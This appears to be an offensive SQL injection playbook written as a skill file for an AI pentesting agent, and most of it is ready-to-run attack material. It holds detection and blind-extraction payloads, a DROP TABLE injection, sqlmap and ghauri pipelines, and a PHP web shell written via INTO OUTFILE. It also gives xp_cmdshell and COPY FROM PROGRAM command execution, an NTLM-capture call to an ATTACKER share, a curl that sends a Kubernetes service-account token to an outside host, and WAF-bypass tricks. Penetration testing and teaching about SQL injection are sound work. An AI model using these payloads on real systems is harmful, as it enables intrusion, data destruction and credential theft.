# Moraa — SQL Injection (offensive)

> Load when hunting SQLi. Commands first. Prove impact (data/authn bypass/RCE), don't stop at "error".
> Deep ref: `knowledge/*/offensive-*` and the SnailSploit checklist. With Burp MCP: capture the request,
> `sqlmap -r req.txt` for the grind (Burp holds the auth).

## Workflow
1. Map every input that reaches the DB (URL params, POST body, cookies, **headers** (UA/Referer/
   X-Forwarded-For), JSON fields, API filters/sort, GraphQL args, **WebSocket messages**).
2. Probe → error-based; if no visible error fall back to boolean/time-based blind.
3. Identify DB, enumerate schema, extract minimally to prove.
4. Escalate: file read/write, OS command, cloud metadata (where in scope).

## Detection probes (all vectors)
```
' " ; ) -- /* */ #  \  %   ' OR '1'='1   " OR "1"="1
```
```sql
-- boolean:  ' OR 1=1 --   vs   ' OR 1=2 --   (diff response size/content)
-- time:     MySQL ' OR SLEEP(5)--   PG ' OR pg_sleep(5)--   MSSQL ' WAITFOR DELAY '0:0:5'--
--           Oracle '; BEGIN DBMS_LOCK.SLEEP(5); END;--   (or DBMS_PIPE.RECEIVE_MESSAGE('a',5))
-- JSON:     MySQL id=1 AND JSON_EXTRACT('{"a":1}','$.a')=1   PG id=1 AND '{"a":1}'::jsonb ? 'a'
```
Modern vectors:
```
GraphQL:   {"query":"query{users(filter:\"' OR 1=1 --\"){id email}}"}
WebSocket: ws.send('{"action":"search","query":"test\\' OR 1=1--"}')
REST:      {"filter":{"name":{"$regex":"admin' OR 1=1--"}},"sort":"name'; DROP TABLE users--"}
2nd-order: inject in signup/profile field → triggers when later read by an admin/report query
```

## Automation
```bash
# pipeline
subfinder -d T -silent | httpx -silent | waybackurls | gf sqli | tee sqli.txt
sqlmap -m sqli.txt --batch --dbs
# from a Burp-captured request (keeps auth) — best for authed endpoints
sqlmap -r req.txt --batch --dbs --risk=2 --level=3
ghauri -u "https://T/p?id=1" --dbs        # faster time-based blind
# hidden params
katana -u https://T -silent | arjun -i - -oJ params.json
```

## Exploitation
```sql
-- UNION column count / string col
' UNION SELECT NULL--   ' UNION SELECT NULL,NULL--   ' UNION SELECT 'a',NULL--
-- version
@@version (MySQL/MSSQL)   version() (PG)   banner FROM v$version (Oracle)
-- tables / columns
' UNION SELECT table_name,1 FROM information_schema.tables--
' UNION SELECT column_name,1 FROM information_schema.columns WHERE table_name='users'--
-- blind extract
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 0,1)='a'--
' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--
```

## DB-specific escalation
```sql
-- MySQL: file read/write
' UNION SELECT LOAD_FILE('/etc/passwd')--
' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/s.php'--   (needs FILE priv + path)
-- MSSQL: OS cmd / registry / linked-server
'; EXEC xp_cmdshell 'whoami'--     '; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
'; EXEC master..xp_dirtree '\\ATTACKER\share'--   (NTLM capture → relay/crack)
-- PostgreSQL: cmd exec / file
'; CREATE TABLE x(o text); COPY x FROM PROGRAM 'id'; SELECT * FROM x;--
' UNION SELECT pg_read_file('/etc/passwd',0,1000)--
-- Oracle: privs / OOB
' UNION SELECT * FROM SYS.USER_ROLE_PRIVS--
```

## NoSQL / graph
```
Mongo:  username[$ne]=x&password[$ne]=x   user[$regex]=^adm   {"$where":"sleep(5000)"}
Neo4j:  ' OR 1=1 //     (CVE-2024-34517; older 5.x IMMUTABLE-proc privesc)
```

## WAF bypass
| Trick | Example |
|---|---|
| case | `SeLeCt UnIoN` |
| inline comment | `UN/**/ION SE/**/LECT` |
| whitespace | `UNION/**/SELECT`, `%0a`, `%09` |
| encoding | url `%55%4E...`, hex `0x53454C454354`, double `%252f` |
| concat | MySQL `CONCAT()`, Oracle/PG `||`, MSSQL `+` |
| JSON/param confusion | prefix dummy `/**/{"a":1}` |
| HTTP/2 (h2/h2c) | replay to obscure payload from perimeter WAF |
```
sqlmap --tamper=space2comment,charencode,between   # (Atlas suggests tampers)
```

## Cloud / serverless angles (in scope only)
```sql
' UNION SELECT LOAD_FILE('http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE')--  -- MySQL+FILE, SSRF via DB
'; COPY (SELECT '') TO PROGRAM 'curl http://OAST/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)'--  -- PG in k8s
-- Lambda connection-pool poisoning: SET ROLE persists across reused connections → injectable role
```

## ORM sinks to grep in JS/source
```
Sequelize sequelize.literal(`name='${x}'`) / .query without replacements   (CVE-2023-22578)
TypeORM where:`id=${x}`   Prisma $executeRawUnsafe/$queryRawUnsafe(`... ${x}`)   Knex .whereRaw without ?
Hibernate createQuery("... '"+x+"'")
```
Safe forms (what a fix looks like): parameterized/replacements, tagged `$queryRaw\`... ${x}\``, `whereRaw('=?',[x])`.

## Cheatsheet
| DB | version | sleep | concat | schema |
|----|---|---|---|---|
| MySQL | `@@version` | `SLEEP(5)` | `CONCAT(a,b)` | `information_schema.tables` |
| MSSQL | `@@version` | `WAITFOR DELAY '0:0:5'` | `a+b` | `information_schema.tables` |
| PG | `version()` | `pg_sleep(5)` | `a||b` | `information_schema.tables` |
| Oracle | `v$version` | `DBMS_PIPE.RECEIVE_MESSAGE('a',5)` | `a||b` | `all_tables` |

→ `validate.md` → `findings/` with the exact injectable request + extracted proof (redact real data).
